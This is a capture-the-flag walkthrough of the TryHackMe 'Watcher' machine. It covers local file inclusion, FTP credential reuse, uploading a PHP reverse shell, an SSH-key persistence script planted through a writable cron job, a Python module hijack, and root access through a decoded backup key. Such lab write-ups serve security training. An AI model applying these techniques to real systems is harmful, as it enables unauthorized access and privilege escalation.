<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>watcher</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>watcher</h1><br/><p><strong><h1>THM: Watcher</h1></strong></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p><img src="images/42-1.png" alt="images/42-1.png" /></p><p></p><p><strong>Dirsearch</strong></p><p><img src="images/42-2.png" alt="images/42-2.png" /></p><p></p><p><strong>Website Enumeration</strong></p><p></p><p><img src="images/42-3.png" alt="images/42-3.png" /></p><p></p><p>Its a <strong>PHP</strong> web server running <strong>Jekyll v4.1.1</strong> for static page generation</p><p>The Login link found in Dirsearch is not working.</p><p>However, we found some answers in <strong>/robots.txt</strong></p><p></p><p><img src="images/42-4.png" alt="images/42-4.png" /></p><p></p><p>We were able to get to <strong>/flag_1.txt</strong> but the /<strong>secret_file....</strong> is forbidden. We will come back to it later.</p><p></p><p><strong>LFI Enumeration</strong></p><p>THM Hint: LFI</p><p>I noticed the URL when i opned any item.</p><p></p><p><strong>http://10.10.70.174/post.php?post=striped.php</strong> </p><p><img src="images/42-5.png" alt="images/42-5.png" /></p><p></p><p>It could be a potential LFI vector. Lets use <strong>LFISuite</strong> to scan it.</p><p></p><p><img src="images/42-6.png" alt="images/42-6.png" /></p><p></p><p>LFISuite indeed suggests that the the URL is vulnerable. Lets try to open those 2 files manually.</p><p>Indeed it was vulnerable.</p><p></p><p><img src="images/42-7.png" alt="images/42-7.png" /></p><p></p><p>Users Found:</p><p></p><p><strong>will</strong></p><p><strong>ftpuser</strong></p><p><strong>mat</strong></p><p><strong>toby</strong></p><p></p><p>Now, remember we had a <strong>/secret_filsecret_file_do_not_read.txte_do_not_read.txt</strong> file which we had no permission to open in the web server. However, with LFI active now lets try to read it.</p><p></p><p><strong>Note:</strong> The /secret... confirms that the file will be in the same directory as the web server. </p><p>So I will use this URL: <strong>http://10.10.70.174/post.php?post=secret_file_do_not_read.txt</strong></p><p></p><p><img src="images/42-8.png" alt="images/42-8.png" /></p><p></p><p>It opened and indeed, we found FTP credentials.</p><p></p><p><strong>FTP Credentials Found</strong></p><p>Username: 	<strong>ftpuser</strong></p><p>Password:	<strong>givemefiles777</strong></p><p></p><p></p><p><strong>FTP Enumeration</strong></p><p></p><p><img src="images/42-9.png" alt="images/42-9.png" /></p><p></p><p>I was able to login successfully with the FTP credentials. I got the <strong>flag_2.txt</strong>.</p><p>I noticed that the directory files is <strong>writable</strong> by me(ftpuser) , so i created a file <strong>hacked.txt</strong> with some <strong>contents</strong> to check if i can access it from browser.</p><p></p><p>The default storage location for FTP is FTP user&#39;s home directory. However, it uses another directory named <strong>ftp</strong>.</p><p>Eg. <strong>/home/$USER/ftp</strong> </p><p></p><p>How i found this ?</p><p>I searched for configuration files for <strong>vsftpd 3.0.3</strong> in google and found the configurations are stored in <strong>/etc/vsftpd.conf</strong></p><p>As we have LFI I open the file.</p><p></p><p><strong>http://10.10.70.174/post.php?post=/etc/vsftpd.conf</strong></p><p><img src="images/42-10.png" alt="images/42-10.png" /></p><p></p><p></p><p>We can see the highlighted local root section. I open the same in our case.</p><p></p><p><strong>/home/ftpuser/ftp/flag_2.txt</strong></p><p>or</p><p><strong>/home/ftpuser/ftp/files/hacked.txt</strong></p><p></p><p><strong>RCE</strong></p><p>We can run any of these in the LFI to confirm that we found the FTP&#39;s data directory. Now we can put PHP-Reverse-Shell through FTP inside the files folder and can run it using LFI.</p><p></p><p><img src="images/42-11.png" alt="images/42-11.png" /></p><p><img src="images/42-12.png" alt="images/42-12.png" /></p><p></p><p>The above confirms that we can use RCE. Lets create a PHP Reverse Shell and upload it with <strong>FTP</strong>.</p><p>We use the following.</p><p><strong>/usr/share/webshells/php/php-reverse-shell.php</strong> form pentestmonkey</p><p></p><p>I make the necessary IP and Port changes in the php file and uploaded it inside the files directory.</p><p></p><p><img src="images/42-13.png" alt="images/42-13.png" /></p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p>Lets start a netcat listener and open the file in the browser using LFI.</p><p></p><p>Open this URL: <strong>http://10.10.70.174/post.php?post=/home/ftpuser/ftp/files/php-reverse-shell.php</strong> </p><p></p><p><img src="images/42-14.png" alt="images/42-14.png" /></p><p></p><p>We have initial access of the system.</p><p></p><p>Next, I searched for the next flag and found it inside a directory named <strong>more_secrets_a9f10a</strong> in the root directory of web server.</p><p></p><p><img src="images/42-15.png" alt="images/42-15.png" /></p><p></p><p>No Privilege Escalation vectors are seen in this user.</p><p>Next, Lets try to do lateral movement to other users.</p><p></p><p>Users Found:</p><p></p><p><strong>will</strong></p><p><strong></strong>ftpuser<strong></strong></p><p><strong>mat</strong></p><p><strong>toby</strong></p><p></p><p><strong><h2>Lateral Movement</h2></strong></p><p></p><p>I stabilized the shell with python. [<strong>Note:</strong> For this machine, i used <strong>/usr/bin/python3</strong>]</p><p>Check : (<strong>CybeXRay Guides ----&gt;	Shells ----&gt;	Shell Beautify</strong>)</p><p></p><p><img src="images/42-16.png" alt="images/42-16.png" /></p><p></p><p>Then upon checking for sudo privileges, I found we can run any program as user <strong>toby</strong>.</p><p>I run <strong>sudo -u toby /bin/bash</strong> to switch to user <strong>toby</strong></p><p></p><p>We got <strong>flag_4.txt</strong> and a <strong>note</strong> to continue our lateral movement.</p><p></p><p></p><p><img src="images/42-17.png" alt="images/42-17.png" /></p><p></p><p>I read the note.txt and found that there is crontab entry. I checked it &amp; indeed a <strong>script</strong> which is <strong>writable</strong> by <strong>me(toby)</strong> gets run every minute as the user <strong>mat</strong></p><p></p><p><strong>My Solution : (Without using a reverse shell connection)</strong></p><p></p><p>I open the <strong>cow.sh</strong> and changed its content to the following.</p><p></p><p><em>#!/bin/bash</em></p><p><em>cp /home/mat/cow.jpg /tmp/cow.jpg</em></p><p><em></em></p><p><em>if [ ! -d &quot;/home/mat/.ssh/&quot; ]; then</em></p><p><em>        mkdir /home/mat/.ssh</em></p><p><em>        echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCybu4M+3Dw0hOMC5zXhzbTSGZMJ2vVSFTreZVVc1OQyw1eoF4+Yc8nsUOupsWVHRrPIDQQMfsIyPiPHrzxqOcxBTxIOcEvA9/OZ7AG53OGf3RwvAGxgzBSpnpGdtRUEzRJq9aMkxDXz22oymAVghK8xM2IMqI5FZQ7CJjKWxqsX7hXq2QJSO0JfhD/ZWjTi4xzEnAcrUeyxe3ueoLt2vJcS9yKPin8f0wxUAwU2Nm1gtL98SZFnjfxfRi0wbAqKBaEbuxZMFwjwRz/+7Dc8bv4gBKy4LiEtOWIzib6dX7lzFlKTcmo+cXI9OltfZ2FGGS/6AtaUFq5ies1/QfsvcxWGO+Pq5DiO6N4fWrIiSWB5xpsL/lLxmHnx5DH9j2RncTkSRru+goeNLLzhdT8YuvjHQyj6YR/ngHLjZX98W+h4DAnx1fGDG1JNsOd1n6IEc4g42vzAzL5tw7yzdNNERgZts/GVF1K73SHeBKAARuye32yskbOgcK0oDv9M4rjBNs= root@matrix&#39; &gt; /home/mat/.ssh/authorized_keys</em></p><p><em>        chmod 600 /home/mat/.ssh/authorized_keys</em></p><p><em>fi</em></p><p></p><p>I copied my kali machine&#39;s <strong>id_rsa.pub</strong> file to a newly created <strong>.ssh </strong>directory into the file <strong>authrorized_keys</strong> using the above script.</p><p></p><p><img src="images/42-18.png" alt="images/42-18.png" /></p><p></p><p>Then we wait 1 min and try to connec to mat with SSH. If everything works properly, we should be able to SSH into the machine using my own paraphrase.</p><p></p><p>And indeed SSH was successful.</p><p><img src="images/42-19.png" alt="images/42-19.png" /></p><p></p><p>we get the flag_5 in the home directory of mat. Plus there is note to further help in our lateral movement.</p><p></p><p><img src="images/42-20.png" alt="images/42-20.png" /></p><p></p><p>As we can see as per the notes, the program <strong>will_script.py</strong> can be run by <strong>me(mat)</strong> as user <strong>will</strong>.</p><p>We go to scripts folder and check the program.</p><p></p><p><img src="images/42-21.png" alt="images/42-21.png" /></p><p></p><p>The program runs 3 system commands as user <strong>will</strong> &amp; also the program takes input from <strong>sys.argv[1] </strong>from command line.</p><p>Which represents the <strong>*</strong> in the <strong>sudo</strong></p><p><strong>(will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *</strong></p><p></p><p>I run the program as: <strong>sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 2</strong></p><p>To show the <strong>id</strong>, or we can use <strong>1 for ls -lah</strong> or <strong>3 for cat /etc/passwd</strong></p><p></p><p><img src="images/42-22.png" alt="images/42-22.png" /></p><p></p><p>However, one intresting point is that, it uses a function called <strong>get_command</strong> to get parse the user input. </p><p>The <strong>get_command</strong> is loaded from a custom module <strong>cmd.py</strong></p><p><strong>cmd.py</strong> is writable by <strong>me(mat)</strong></p><p></p><p>I <strong>modify</strong> the <strong>cmd.py</strong> to the following:</p><p>(I added my own imports and command)</p><p></p><p><em>import os</em></p><p><em>import sys</em></p><p><em>def get_command(num):</em></p><p><em>        os.system(&quot;/bin/bash&quot;)</em></p><p><em>        if(num == &quot;1&quot;):</em></p><p><em>                return &quot;ls -lah&quot;</em></p><p><em>        if(num == &quot;2&quot;):</em></p><p><em>                return &quot;id&quot;</em></p><p><em>        if(num == &quot;3&quot;):</em></p><p><em>                return &quot;cat /etc/passwd&quot;</em></p><p></p><p></p><p><img src="images/42-23.png" alt="images/42-23.png" /></p><p></p><p>As we can see, we have become user <strong>will</strong> now.</p><p></p><p><strong><h2>Privilege Escalation</h2></strong></p><p></p><p>Now, starts the path to root.</p><p></p><p><img src="images/42-24.png" alt="images/42-24.png" /></p><p></p><p>Upon enumerating the user, I found that <strong>will</strong> belongs to a group named <strong>adm</strong></p><p>I then started to find all files having group <strong>adm</strong></p><p></p><p><strong>find / -type f -group adm 2&gt;/dev/null</strong></p><p></p><p>We found a file at an  intresting location <strong>/opt/backups</strong></p><p>The file name is <strong>key.b64</strong></p><p></p><p>The extention suggests its base64. Lets view it.</p><p></p><p><img src="images/42-25.png" alt="images/42-25.png" /></p><p></p><p>It Looks like base64 encoded so I decoded it and found an id_rsa key. May be its the ssh id_rsa of root.</p><p><strong>cat key.b64 | base64 -d</strong></p><p><img src="images/42-26.png" alt="images/42-26.png" /></p><p></p><p>I copied the key to a local file <strong>watcher_id_rsa</strong> and changed its permission to <strong>600</strong>. I tried to SHH into the machine as root using the <strong>watcher_id_rsa</strong> file. I was successful.</p><p></p><p><img src="images/42-27.png" alt="images/42-27.png" /></p><p></p><p>Thanks!!</p></div>
</body>
</html>
